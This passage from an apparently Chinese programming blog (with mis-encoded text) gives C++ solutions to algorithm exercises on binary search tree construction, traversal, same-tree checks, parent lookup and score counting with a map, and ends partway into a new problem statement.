class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">node</span>&#123;</span></span><br><span class="line"><span class="keyword">int</span> d;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">node</span> *<span class="title">l</span>, *<span class="title">r</span>;</span></span><br><span class="line">&#125; *Tree;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">build</span><span class="params">(Tree &amp;t, <span class="keyword">int</span> a)</span></span>&#123;</span><br><span class="line"><span class="keyword">if</span>(t == <span class="literal">NULL</span>)&#123;</span><br><span class="line">t = <span class="keyword">new</span> node;</span><br><span class="line">t-&gt;d = a;</span><br><span class="line">t-&gt;l = <span class="literal">NULL</span>;</span><br><span class="line">t-&gt;r = <span class="literal">NULL</span>;</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(a == t-&gt;d) <span class="keyword">return</span>;</span><br><span class="line"><span class="keyword">if</span>(a &lt; t-&gt;d) <span class="built_in">build</span>(t-&gt;l, a);</span><br><span class="line"><span class="keyword">else</span> <span class="built_in">build</span>(t-&gt;r, a);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">PreOrdertraverse</span><span class="params">(Tree t)</span></span>&#123;</span><br><span class="line"><span class="keyword">if</span>(t != <span class="literal">NULL</span>)&#123;</span><br><span class="line">cout &lt;&lt; t-&gt;d &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line"><span class="built_in">PreOrdertraverse</span>(t-&gt;l);</span><br><span class="line"><span class="built_in">PreOrdertraverse</span>(t-&gt;r);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">MidOrdertraverse</span><span class="params">(Tree t)</span></span>&#123;</span><br><span class="line"><span class="keyword">if</span>(t != <span class="literal">NULL</span>)&#123;</span><br><span class="line"><span class="built_in">MidOrdertraverse</span>(t-&gt;l);</span><br><span class="line">cout &lt;&lt; t-&gt;d &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line"><span class="built_in">MidOrdertraverse</span>(t-&gt;r);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">PostOrdertraverse</span><span class="params">(Tree t)</span></span>&#123;</span><br><span class="line"><span class="keyword">if</span>(t != <span class="literal">NULL</span>)&#123;</span><br><span class="line"><span class="built_in">PostOrdertraverse</span>(t-&gt;l);</span><br><span class="line"><span class="built_in">PostOrdertraverse</span>(t-&gt;r);</span><br><span class="line">cout &lt;&lt; t-&gt;d &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">int</span> n;</span><br><span class="line"><span class="keyword">while</span>(cin &gt;&gt; n)&#123;</span><br><span class="line">Tree root;</span><br><span class="line">root = <span class="literal">NULL</span>;</span><br><span class="line"><span class="keyword">int</span> a;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i++)&#123;</span><br><span class="line">cin &gt;&gt; a;</span><br><span class="line"><span class="built_in">build</span>(root, a);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">PreOrdertraverse</span>(root);</span><br><span class="line">cout &lt;&lt; endl;</span><br><span class="line"><span class="built_in">MidOrdertraverse</span>(root);</span><br><span class="line">cout &lt;&lt; endl;</span><br><span class="line"><span class="built_in">PostOrdertraverse</span>(root);</span><br><span class="line">cout &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="äºŒå‰æœç´¢æ ‘"><a href="#äºŒå‰æœç´¢æ ‘" class="headerlink" title="äºŒå‰æœç´¢æ ‘"></a>äºŒå‰æœç´¢æ ‘</h1><h5 id="é¢˜ç›®æè¿°-21"><a href="#é¢˜ç›®æè¿°-21" class="headerlink" title="é¢˜ç›®æè¿°"></a>é¢˜ç›®æè¿°</h5><p>åˆ¤æ–­ä¸¤åºåˆ—æ˜¯å¦ä¸ºåŒä¸€äºŒå‰æœç´¢æ ‘åºåˆ—</p><h5 id="è¾“å…¥è¾“å‡ºæ ¼å¼-19"><a href="#è¾“å…¥è¾“å‡ºæ ¼å¼-19" class="headerlink" title="è¾“å…¥è¾“å‡ºæ ¼å¼"></a>è¾“å…¥è¾“å‡ºæ ¼å¼</h5><h6 id="è¾“å…¥æè¿°-21"><a href="#è¾“å…¥æè¿°-21" class="headerlink" title="è¾“å…¥æè¿°:"></a>è¾“å…¥æè¿°:</h6><figure class="highlight excel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">å¼€å§‹ä¸€ä¸ªæ•°<span class="built_in">n</span>ï¼Œ(<span class="number">1</span>&lt;=<span class="built_in">n</span>&lt;=<span class="number">20</span>) è¡¨ç¤ºæœ‰<span class="built_in">n</span>ä¸ªéœ€è¦åˆ¤æ–­ï¼Œ<span class="built_in">n</span>= <span class="number">0</span> çš„æ—¶å€™è¾“å…¥ç»“æŸã€‚</span><br><span class="line">æ¥ä¸‹å»ä¸€è¡Œæ˜¯ä¸€ä¸ªåºåˆ—ï¼Œåºåˆ—é•¿åº¦å°äº<span class="number">10</span>ï¼ŒåŒ…å«(<span class="number">0</span>~<span class="number">9</span>)çš„æ•°å­—ï¼Œæ²¡æœ‰é‡å¤æ•°å­—ï¼Œæ ¹æ®è¿™ä¸ªåºåˆ—å¯ä»¥æ„é€ å‡ºä¸€é¢—äºŒå‰æœç´¢æ ‘ã€‚</span><br><span class="line">æ¥ä¸‹å»çš„<span class="built_in">n</span>è¡Œæœ‰<span class="built_in">n</span>ä¸ªåºåˆ—ï¼Œæ¯ä¸ªåºåˆ—æ ¼å¼è·Ÿç¬¬ä¸€ä¸ªåºåˆ—ä¸€æ ·ï¼Œè¯·åˆ¤æ–­è¿™ä¸¤ä¸ªåºåˆ—æ˜¯å¦èƒ½ç»„æˆåŒä¸€é¢—äºŒå‰æœç´¢æ ‘ã€‚</span><br></pre></td></tr></table></figure><h6 id="è¾“å‡ºæè¿°-21"><a href="#è¾“å‡ºæè¿°-21" class="headerlink" title="è¾“å‡ºæè¿°:"></a>è¾“å‡ºæè¿°:</h6><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">å¦‚æœåºåˆ—ç›¸åŒåˆ™è¾“å‡º<span class="keyword">YES</span>ï¼Œå¦åˆ™è¾“å‡º<span class="keyword">NO</span></span><br></pre></td></tr></table></figure><p>æˆ‘çš„æ–¹æ³•æ˜¯å¯¹æ¯ä¸ªåºåˆ—å»ºä¸€ä¸ªæ ‘ï¼Œç„¶åå­˜å‚¨å’Œå…¶å‰åºéå†å­—ç¬¦ä¸²è¿›è¡Œæ¯”è¾ƒ</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">node</span>&#123;</span></span><br><span class="line"><span class="keyword">char</span> d;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">node</span> *<span class="title">l</span>, *<span class="title">r</span>;</span></span><br><span class="line">&#125; *Tree;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> a;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">build</span><span class="params">(Tree &amp;t, <span class="keyword">char</span> a)</span></span>&#123;</span><br><span class="line"><span class="keyword">if</span>(t == <span class="literal">NULL</span>)&#123;</span><br><span class="line">t = <span class="keyword">new</span> node;</span><br><span class="line">t-&gt;d = a;</span><br><span class="line">t-&gt;l = <span class="literal">NULL</span>;</span><br><span class="line">t-&gt;r = <span class="literal">NULL</span>;</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(a == t-&gt;d) <span class="keyword">return</span>;</span><br><span class="line"><span class="keyword">if</span>(a &lt; t-&gt;d) <span class="built_in">build</span>(t-&gt;l, a);</span><br><span class="line"><span class="keyword">else</span> <span class="built_in">build</span>(t-&gt;r, a);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">PreOrdertraverse</span><span class="params">(Tree t, string &amp;s)</span></span>&#123;</span><br><span class="line"><span class="keyword">if</span>(t != <span class="literal">NULL</span>)&#123;</span><br><span class="line">s+= t-&gt;d;</span><br><span class="line"><span class="built_in">PreOrdertraverse</span>(t-&gt;l, s);</span><br><span class="line"><span class="built_in">PreOrdertraverse</span>(t-&gt;r, s);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">int</span> n;</span><br><span class="line"><span class="keyword">while</span>(cin &gt;&gt; n)&#123;</span><br><span class="line"><span class="keyword">if</span>(n == <span class="number">0</span>) <span class="keyword">break</span>;</span><br><span class="line">Tree root;</span><br><span class="line">root = <span class="literal">NULL</span>;</span><br><span class="line">string s, s0;</span><br><span class="line">cin &gt;&gt; s;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; s.<span class="built_in">size</span>(); i++)&#123;</span><br><span class="line"><span class="built_in">build</span>(root, s[i]); </span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">PreOrdertraverse</span>(root, s0);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i++)&#123;</span><br><span class="line">string st;</span><br><span class="line">cin &gt;&gt; s;</span><br><span class="line">Tree rt;</span><br><span class="line">rt = <span class="literal">NULL</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; s.<span class="built_in">size</span>(); j++)&#123;</span><br><span class="line"><span class="built_in">build</span>(rt, s[j]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">PreOrdertraverse</span>(rt, st);</span><br><span class="line"><span class="keyword">if</span>(st == s0)&#123;</span><br><span class="line">cout &lt;&lt; <span class="string">&quot;YES&quot;</span> &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">cout &lt;&lt; <span class="string">&quot;NO&quot;</span> &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>çœ‹äº†ä¸‹åˆ«äººçš„æ–¹æ³•ï¼Œéœ€è¦å‰åºå’Œä¸­åºæ‰èƒ½ç¡®å®šä¸€é¢—å”¯ä¸€çš„æ ‘ï¼Œæˆ‘åªç”¨äº†å‰åºåº”è¯¥æ˜¯æœ‰é—®é¢˜çš„ï¼Œä½†æµ‹è¯•ç”¨ä¾‹åº”è¯¥é‡Œæ²¡æœ‰ä¸“é—¨è®¾è®¡ä¸€ä¸ªè¿™æ ·çš„ç”¨ä¾‹233.</p><h3 id="äºŒå‰æ’åºæ ‘-åç§‘"><a href="#äºŒå‰æ’åºæ ‘-åç§‘" class="headerlink" title="äºŒå‰æ’åºæ ‘ - åç§‘"></a>äºŒå‰æ’åºæ ‘ - åç§‘</h3><h5 id="é¢˜ç›®æè¿°-22"><a href="#é¢˜ç›®æè¿°-22" class="headerlink" title="é¢˜ç›®æè¿°"></a>é¢˜ç›®æè¿°</h5><p>äºŒå‰æ’åºæ ‘ï¼Œä¹Ÿç§°ä¸ºäºŒå‰æŸ¥æ‰¾æ ‘ã€‚å¯ä»¥æ˜¯ä¸€é¢—ç©ºæ ‘ï¼Œä¹Ÿå¯ä»¥æ˜¯ä¸€é¢—å…·æœ‰å¦‚ä¸‹ç‰¹æ€§çš„éç©ºäºŒå‰æ ‘ï¼š 1. è‹¥å·¦å­æ ‘éç©ºï¼Œåˆ™å·¦å­æ ‘ä¸Šæ‰€æœ‰èŠ‚ç‚¹å…³é”®å­—å€¼å‡ä¸å¤§äºæ ¹èŠ‚ç‚¹çš„å…³é”®å­—å€¼ï¼› 2. è‹¥å³å­æ ‘éç©ºï¼Œåˆ™å³å­æ ‘ä¸Šæ‰€æœ‰èŠ‚ç‚¹å…³é”®å­—å€¼å‡ä¸å°äºæ ¹èŠ‚ç‚¹çš„å…³é”®å­—å€¼ï¼› 3. å·¦ã€å³å­æ ‘æœ¬èº«ä¹Ÿæ˜¯ä¸€é¢—äºŒå‰æ’åºæ ‘ã€‚ ç°åœ¨ç»™ä½ Nä¸ªå…³é”®å­—å€¼å„ä¸ç›¸åŒçš„èŠ‚ç‚¹ï¼Œè¦æ±‚ä½ æŒ‰é¡ºåºæ’å…¥ä¸€ä¸ªåˆå§‹ä¸ºç©ºæ ‘çš„äºŒå‰æ’åºæ ‘ä¸­ï¼Œæ¯æ¬¡æ’å…¥åæˆåŠŸåï¼Œæ±‚ç›¸åº”çš„çˆ¶äº²èŠ‚ç‚¹çš„å…³é”®å­—å€¼ï¼Œå¦‚æœæ²¡æœ‰çˆ¶äº²èŠ‚ç‚¹ï¼Œåˆ™è¾“å‡º-1ã€‚</p><h5 id="è¾“å…¥è¾“å‡ºæ ¼å¼-20"><a href="#è¾“å…¥è¾“å‡ºæ ¼å¼-20" class="headerlink" title="è¾“å…¥è¾“å‡ºæ ¼å¼"></a>è¾“å…¥è¾“å‡ºæ ¼å¼</h5><h6 id="è¾“å…¥æè¿°-22"><a href="#è¾“å…¥æè¿°-22" class="headerlink" title="è¾“å…¥æè¿°:"></a>è¾“å…¥æè¿°:</h6><figure class="highlight excel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">è¾“å…¥åŒ…å«å¤šç»„æµ‹è¯•æ•°æ®ï¼Œæ¯ç»„æµ‹è¯•æ•°æ®ä¸¤è¡Œã€‚</span><br><span class="line">ç¬¬ä¸€è¡Œï¼Œä¸€ä¸ªæ•°å­—<span class="built_in">N</span>ï¼ˆ<span class="built_in">N</span>&lt;=<span class="number">100</span>ï¼‰ï¼Œè¡¨ç¤ºå¾…æ’å…¥çš„èŠ‚ç‚¹æ•°ã€‚</span><br><span class="line">ç¬¬äºŒè¡Œï¼Œ<span class="built_in">N</span>ä¸ªäº’ä¸ç›¸åŒçš„æ­£æ•´æ•°ï¼Œè¡¨ç¤ºè¦é¡ºåºæ’å…¥èŠ‚ç‚¹çš„å…³é”®å­—å€¼ï¼Œè¿™äº›å€¼ä¸è¶…è¿‡<span class="number">10</span>^<span class="number">8</span>ã€‚</span><br></pre></td></tr></table></figure><h6 id="è¾“å‡ºæè¿°-22"><a href="#è¾“å‡ºæè¿°-22" class="headerlink" title="è¾“å‡ºæè¿°:"></a>è¾“å‡ºæè¿°:</h6><figure class="highlight excel"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">è¾“å‡ºå…±<span class="built_in">N</span>è¡Œï¼Œæ¯æ¬¡æ’å…¥èŠ‚ç‚¹åï¼Œè¯¥èŠ‚ç‚¹å¯¹åº”çš„çˆ¶äº²èŠ‚ç‚¹çš„å…³é”®å­—å€¼ã€‚</span><br></pre></td></tr></table></figure><p>è¾¹æ’å…¥è¾¹æ‰¾ï¼Œé€’å½’çš„å‡½æ•°åŠ ä¸€ä¸ªå‚æ•°ä½œä¸ºæ ¹èŠ‚ç‚¹å³å¯</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">node</span>&#123;</span></span><br><span class="line"><span class="keyword">int</span> d;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">node</span> *<span class="title">l</span>, *<span class="title">r</span>;</span></span><br><span class="line">&#125;*Tree;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">build</span><span class="params">(Tree r, Tree &amp;t, <span class="keyword">int</span> a)</span></span>&#123;</span><br><span class="line"><span class="keyword">int</span> res;</span><br><span class="line"><span class="keyword">if</span>(t == <span class="literal">NULL</span>)&#123;</span><br><span class="line">t = <span class="keyword">new</span> node;</span><br><span class="line">t-&gt;d = a;</span><br><span class="line">t-&gt;l = <span class="literal">NULL</span>;</span><br><span class="line">t-&gt;r = <span class="literal">NULL</span>;</span><br><span class="line"><span class="keyword">return</span> r-&gt;d;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(a == t-&gt;d) res = r-&gt;d;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(a &lt; t-&gt;d) res = <span class="built_in">build</span>(t, t-&gt;l, a);</span><br><span class="line"><span class="keyword">else</span> res = <span class="built_in">build</span>(t, t-&gt;r, a);</span><br><span class="line"><span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">int</span> n;</span><br><span class="line"><span class="keyword">while</span>(cin &gt;&gt; n)&#123;</span><br><span class="line">Tree tmp = <span class="keyword">new</span> node;</span><br><span class="line">tmp-&gt;d = <span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line">Tree root;</span><br><span class="line">root = <span class="literal">NULL</span>;</span><br><span class="line"><span class="keyword">int</span> a[n];</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i++)&#123;</span><br><span class="line">cin &gt;&gt; a[i];</span><br><span class="line"><span class="keyword">int</span> x = <span class="built_in">build</span>(tmp, root, a[i]);</span><br><span class="line">cout &lt;&lt; x &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="hash"><a href="#hash" class="headerlink" title="hash"></a>hash</h2><h3 id="ç»Ÿè®¡åŒæˆç»©å­¦ç”Ÿäººæ•°"><a href="#ç»Ÿè®¡åŒæˆç»©å­¦ç”Ÿäººæ•°" class="headerlink" title="ç»Ÿè®¡åŒæˆç»©å­¦ç”Ÿäººæ•°"></a>ç»Ÿè®¡åŒæˆç»©å­¦ç”Ÿäººæ•°</h3><h5 id="é¢˜ç›®æè¿°-23"><a href="#é¢˜ç›®æè¿°-23" class="headerlink" title="é¢˜ç›®æè¿°"></a>é¢˜ç›®æè¿°</h5><p>è¯»å…¥Nåå­¦ç”Ÿçš„æˆç»©ï¼Œå°†è·å¾—æŸä¸€ç»™å®šåˆ†æ•°çš„å­¦ç”Ÿäººæ•°è¾“å‡ºã€‚</p><h5 id="è¾“å…¥è¾“å‡ºæ ¼å¼-21"><a href="#è¾“å…¥è¾“å‡ºæ ¼å¼-21" class="headerlink" title="è¾“å…¥è¾“å‡ºæ ¼å¼"></a>è¾“å…¥è¾“å‡ºæ ¼å¼</h5><h6 id="è¾“å…¥æè¿°-23"><a href="#è¾“å…¥æè¿°-23" class="headerlink" title="è¾“å…¥æè¿°:"></a>è¾“å…¥æè¿°:</h6><figure class="highlight excel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">æµ‹è¯•è¾“å…¥åŒ…å«è‹¥å¹²æµ‹è¯•ç”¨ä¾‹ï¼Œæ¯ä¸ªæµ‹è¯•ç”¨ä¾‹çš„æ ¼å¼ä¸º</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ç¬¬<span class="number">1</span>è¡Œï¼š<span class="built_in">N</span></span><br><span class="line">ç¬¬<span class="number">2</span>è¡Œï¼š<span class="built_in">N</span>åå­¦ç”Ÿçš„æˆç»©ï¼Œç›¸é‚»ä¸¤æ•°å­—ç”¨ä¸€ä¸ªç©ºæ ¼é—´éš”ã€‚</span><br><span class="line">ç¬¬<span class="number">3</span>è¡Œï¼šç»™å®šåˆ†æ•°</span><br><span class="line"></span><br><span class="line">å½“è¯»åˆ°<span class="built_in">N</span>=<span class="number">0</span>æ—¶è¾“å…¥ç»“æŸã€‚å…¶ä¸­<span class="built_in">N</span>ä¸è¶…è¿‡<span class="number">1000</span>ï¼Œæˆç»©åˆ†æ•°ä¸ºï¼ˆåŒ…å«ï¼‰<span class="number">0</span>åˆ°<span class="number">100</span>ä¹‹é—´çš„ä¸€ä¸ªæ•´æ•°ã€‚</span><br></pre></td></tr></table></figure><h6 id="è¾“å‡ºæè¿°-23"><a href="#è¾“å‡ºæè¿°-23" class="headerlink" title="è¾“å‡ºæè¿°:"></a>è¾“å‡ºæè¿°:</h6><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">å¯¹æ¯ä¸ªæµ‹è¯•ç”¨ä¾‹ï¼Œå°†è·å¾—ç»™å®šåˆ†æ•°çš„å­¦ç”Ÿäººæ•°è¾“å‡ºã€‚</span><br></pre></td></tr></table></figure><p>ç›´æ¥map</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">int</span> n;</span><br><span class="line"><span class="keyword">while</span>(cin &gt;&gt; n)&#123;</span><br><span class="line"><span class="keyword">if</span>(n == <span class="number">0</span>) <span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">int</span> a[n], sn;</span><br><span class="line">map&lt;<span class="keyword">int</span>, <span class="keyword">int</span>&gt; m;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i++)&#123;</span><br><span class="line">cin &gt;&gt; a[i];</span><br><span class="line">m[a[i]] ++;</span><br><span class="line">&#125;</span><br><span class="line">cin &gt;&gt; sn;</span><br><span class="line"><span class="keyword">if</span>(m.<span class="built_in">find</span>(sn) != m.<span class="built_in">end</span>())&#123;</span><br><span class="line">cout &lt;&lt; m[sn] &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">cout &lt;&lt; <span class="number">0</span> &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="è°æ˜¯ä½ çš„æ½œåœ¨æœ‹å‹"><a href="#è°æ˜¯ä½ çš„æ½œåœ¨æœ‹å‹" class="headerlink" title="è°æ˜¯ä½ çš„æ½œåœ¨æœ‹å‹"></a>è°æ˜¯ä½ çš„æ½œåœ¨æœ‹å‹</h3><h5 id="é¢˜ç›®æè¿°-24"><a href="#é¢˜ç›®æè¿°-24" class="headerlink" title="é¢˜ç›®æè¿°"></a>é¢˜ç›®æè¿°</h5><pre><code>â€œè‡­å‘³ç›¸æŠ•â€â€”â€”è¿™æ˜¯æˆ‘ä»¬æè¿°æœ‹å‹æ—¶å–œæ¬¢ç”¨çš„è¯æ±‡ã€‚ä¸¤ä¸ªäººæ˜¯æœ‹å‹é€šå¸¸æ„å‘³ç€ä»–ä»¬å­˜åœ¨ç€è®¸å¤šå…±åŒçš„å…´è¶£ã€‚ç„¶è€Œä½œä¸ºä¸€ä¸ªå®…ç”·ï¼Œä½ å‘ç°è‡ªå·±ä¸ä»–äººç›¸äº’äº†è§£çš„æœºä¼šå¹¶ä¸å¤ªå¤šã€‚å¹¸è¿çš„æ˜¯ï¼Œä½ æ„å¤–å¾—åˆ°äº†ä¸€ä»½åŒ—å¤§å›¾ä¹¦é¦†çš„å›¾ä¹¦å€Ÿé˜…è®°å½•ï¼Œäºæ˜¯ä½ æŒ‘ç¯ç†¬å¤œåœ°ç¼–ç¨‹ï¼Œæƒ³ä»ä¸­å‘ç°æ½œåœ¨çš„æœ‹å‹ã€‚     é¦–å…ˆä½ 